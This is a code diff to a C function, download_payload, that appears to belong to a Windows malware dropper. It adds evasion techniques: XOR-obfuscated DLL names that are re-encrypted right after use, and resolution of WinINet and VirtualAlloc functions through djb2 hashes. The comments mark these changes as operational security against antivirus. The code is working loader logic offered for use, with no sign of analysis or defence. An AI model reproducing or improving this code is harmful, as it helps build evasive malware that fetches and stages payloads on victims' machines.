@@ -12,24 +12,46 @@ typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD fl
 typedef BOOL (WINAPI *pVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
 
 char* download_payload(const char* url, SIZE_T* payload_size) {
-
+    // load key runtime (in stack)
+    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
+    
     char enc_wininet[] = { /* wininet.dll\0 */ };
-    char enc_IntOpen[] = { /* InternetOpenA\0 */ };
-    char enc_IntOpenUrl[] = { /* InternetOpenUrlA\0 */ };
-    char enc_IntReadFile[] = { /* InternetReadFile\0 */ };
-    char enc_IntClose[] = { /* InternetCloseHandle\0 */ };
     char enc_kernel32[] = { /* kernel32.dll\0 */ };
-    char enc_VirtAlloc[] = { /* VirtualAlloc\0 */ };
-    char enc_VirtFree[] = { /* VirtualFree\0 */ };
 
-    // --- dynamic resolution
+    // API hashes
+    // NOTE: calculate these using hasher.py
+    DWORD hash_IntOpen = 0xF4AD70A1;      // djb2 for "InternetOpenA"
+    DWORD hash_IntOpenUrl = 0x8F5CA3B4;   // djb2 for "InternetOpenUrlA"
+    DWORD hash_IntReadFile = 0xFB4F8EAA;  // djb2 for "InternetReadFile"
+    DWORD hash_IntClose = 0x4241BEF0;     // djb2 for "InternetCloseHandle"
+    DWORD hash_VirtAlloc = 0x382C0F97;    // djb2 for "VirtualAlloc"
+    DWORD hash_VirtFree = 0x668FCF2E;     // djb2 for "VirtualFree"
 
-    pInternetOpenA fnInternetOpenA = (pInternetOpenA) resolve_api(enc_wininet, sizeof(enc_wininet), enc_IntOpen, sizeof(enc_IntOpen), GLOBAL_KEY, GLOBAL_KEY_LEN);
-    pInternetOpenUrlA fnInternetOpenUrlA = (pInternetOpenUrlA) resolve_api(enc_wininet, sizeof(enc_wininet), enc_IntOpenUrl, sizeof(enc_IntOpenUrl), GLOBAL_KEY, GLOBAL_KEY_LEN);
-    pInternetReadFile fnInternetReadFile = (pInternetReadFile) resolve_api(enc_wininet, sizeof(enc_wininet), enc_IntReadFile, sizeof(enc_IntReadFile), GLOBAL_KEY, GLOBAL_KEY_LEN);
-    pInternetCloseHandle fnInternetCloseHandle = (pInternetCloseHandle) resolve_api(enc_wininet, sizeof(enc_wininet), enc_IntClose, sizeof(enc_IntClose), GLOBAL_KEY, GLOBAL_KEY_LEN);
-    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc) resolve_api(enc_kernel32, sizeof(enc_kernel32), enc_VirtAlloc, sizeof(enc_VirtAlloc), GLOBAL_KEY, GLOBAL_KEY_LEN);
-    pVirtualFree fnVirtualFree = (pVirtualFree) resolve_api(enc_kernel32, sizeof(enc_kernel32), enc_VirtFree, sizeof(enc_VirtFree), GLOBAL_KEY, GLOBAL_KEY_LEN);
+    // --- load DLLs dynamically
+    
+    // wininet.dll
+    xor_crypt(enc_wininet, sizeof(enc_wininet), cypher_key, cypher_key_len);
+    HMODULE hWinINet = LoadLibraryA(enc_wininet);
+    // OPSEC: recypher DLL name immediately
+    xor_crypt(enc_wininet, sizeof(enc_wininet), cypher_key, cypher_key_len);
+
+    // kernel32.dll
+    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
+    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
+    // OPSEC: recypher DLL name immediately
+    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
+
+    // if DLL loading fails -> return
+    if (!hWinINet || !hKernel32) return NULL;
+
+    // --- dynamic resolution via hashing
+
+    pInternetOpenA fnInternetOpenA = (pInternetOpenA) get_api_by_hash(hWinINet, hash_IntOpen);
+    pInternetOpenUrlA fnInternetOpenUrlA = (pInternetOpenUrlA) get_api_by_hash(hWinINet, hash_IntOpenUrl);
+    pInternetReadFile fnInternetReadFile = (pInternetReadFile) get_api_by_hash(hWinINet, hash_IntReadFile);
+    pInternetCloseHandle fnInternetCloseHandle = (pInternetCloseHandle) get_api_by_hash(hWinINet, hash_IntClose);
+    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc) get_api_by_hash(hKernel32, hash_VirtAlloc);
+    pVirtualFree fnVirtualFree = (pVirtualFree) get_api_by_hash(hKernel32, hash_VirtFree);
 
     // if AV blocks a function -> return
     if (!fnInternetOpenA || !fnInternetOpenUrlA || !fnInternetReadFile || !fnInternetCloseHandle || !fnVirtualAlloc || !fnVirtualFree) return NULL;
@@ -84,5 +106,4 @@ char* download_payload(const char* url, SIZE_T* payload_size) {
     // save payload size
     *payload_size = total_bytes_read;
     return payload_buffer;
-    
 }
